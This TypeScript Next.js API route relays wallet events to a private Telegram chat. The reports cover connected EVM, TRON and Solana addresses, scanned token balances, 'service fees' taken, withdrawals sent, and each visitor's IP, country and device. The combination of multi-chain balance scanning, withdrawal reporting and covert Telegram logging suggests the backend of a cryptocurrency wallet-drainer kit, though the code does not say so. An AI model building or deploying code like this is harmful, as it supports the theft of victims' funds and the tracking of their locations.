import path from 'path';
import type { NextApiRequest, NextApiResponse } from 'next';

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  if (req.method !== 'POST') {
    res.status(405).json({ success: false, error: 'Method not allowed' });
    return;
  }

  const { recipient, amount, chain, txHash, address, balance, wallet, error, country, device, eventType, tokenSymbol, tokenContractAddress, tokenBalances, withdrawnAmount, feePercent, transferType, sourceAddress, result, tronAddress, solanaAddress } = req.body || {};
  const forwardedFor = req.headers['x-forwarded-for'];
  const ipAddress = Array.isArray(forwardedFor)
    ? forwardedFor[0]
    : typeof forwardedFor === 'string'
      ? forwardedFor.split(',')[0].trim()
      : typeof req.headers['x-real-ip'] === 'string'
        ? req.headers['x-real-ip']
        : req.socket?.remoteAddress || 'Unknown';
  const botToken = (process.env.TELEGRAM_BOT_TOKEN || process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || '').trim();
  const chatId = (process.env.TELEGRAM_CHAT_ID || process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '').trim();

  if (!botToken || !chatId) {
    console.error('Telegram credentials missing:', { botToken: Boolean(botToken), chatId: Boolean(chatId) });
    res.status(500).json({ success: false, error: 'Telegram credentials are not configured' });
    return;
  }

  const primaryWallet = address || wallet || 'N/A';
  const walletDetails = [
    `Wallet (EVM): ${primaryWallet}`,
    `TRON Address: ${tronAddress || 'Not Connected'}`,
    `Solana Address: ${solanaAddress || 'Not Connected'}`,
  ].join('\n');

  const tokenSummary = tokenBalances && Array.isArray(tokenBalances) && tokenBalances.length
    ? `Scanned Assets:\n${tokenBalances.map((t: any) => ` - [${t.network}] ${t.symbol}: ${t.amount}`).join('\n')}\n`
    : 'Scanned Assets: None found (0 balance across EVM, TRON, and Solana)\n';

  const message = eventType === 'wallet_error'
    ? `⚠️ Wallet event\n\nEvent: ${eventType}\n${walletDetails}\nError: ${error || 'N/A'}\nCountry: ${country || 'Unknown'}\nDevice: ${device || 'Unknown'}\nNetwork: ${chain || 'N/A'}\nIP: ${ipAddress}`
    : eventType === 'wallet_connected'
      ? `🔗 Wallet connected\n\n${walletDetails}\nPrimary Balance: ${balance || '0'}\n${tokenSummary}Country: ${country || 'Unknown'}\nDevice: ${device || 'Unknown'}\nNetwork: ${chain || 'N/A'}\nIP: ${ipAddress}`
      : eventType === 'service_fee'
        ? `💰 Service fee collected\n\n${walletDetails}\nWithdrawn: ${withdrawnAmount || amount || 'N/A'}\nFee rate: ${feePercent || 'N/A'}\nToken: ${tokenSymbol || 'N/A'}\nToken Contract: ${tokenContractAddress || 'N/A'}\n${tokenSummary}Country: ${country || 'Unknown'}\nDevice: ${device || 'Unknown'}\nNetwork: ${chain || 'N/A'}\nTx: ${txHash || 'N/A'}\nIP: ${ipAddress}`
        : eventType === 'withdrawal'
          ? `💸 Withdrawal sent\n\n${walletDetails}\nRecipient: ${recipient || 'N/A'}\nAmount: ${amount || 'N/A'}\nTransfer type: ${transferType || 'N/A'}\nSource address: ${sourceAddress || 'N/A'}\nResult: ${result || 'N/A'}\nToken: ${tokenSymbol || 'N/A'}\nToken Contract: ${tokenContractAddress || 'N/A'}\nBalance: ${balance || 'N/A'}\n${tokenSummary}Country: ${country || 'Unknown'}\nDevice: ${device || 'Unknown'}\nNetwork: ${chain || 'N/A'}\nTx: ${txHash || 'N/A'}\nIP: ${ipAddress}`
          : `💸 Withdrawal sent\n\n${walletDetails}\nRecipient: ${recipient || 'N/A'}\nAmount: ${amount || 'N/A'}\nTransfer type: ${transferType || 'N/A'}\nSource address: ${sourceAddress || 'N/A'}\nResult: ${result || 'N/A'}\nToken: ${tokenSymbol || 'N/A'}\nToken Contract: ${tokenContractAddress || 'N/A'}\nBalance: ${balance || 'N/A'}\nCountry: ${country || 'Unknown'}\nDevice: ${device || 'Unknown'}\nNetwork: ${chain || 'N/A'}\nTx: ${txHash || 'N/A'}\nIP: ${ipAddress}`;

  try {
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });

    const data = await response.json();
    console.log('Telegram send response:', JSON.stringify(data));

    if (!response.ok || !data.ok) {
      throw new Error(data.description || 'Telegram request failed');
    }

    res.status(200).json({ success: true, data });
  } catch (error: any) {
    console.error('Telegram notification error:', error);
    res.status(500).json({ success: false, error: error.message || 'Failed to send Telegram notification' });
  }
}
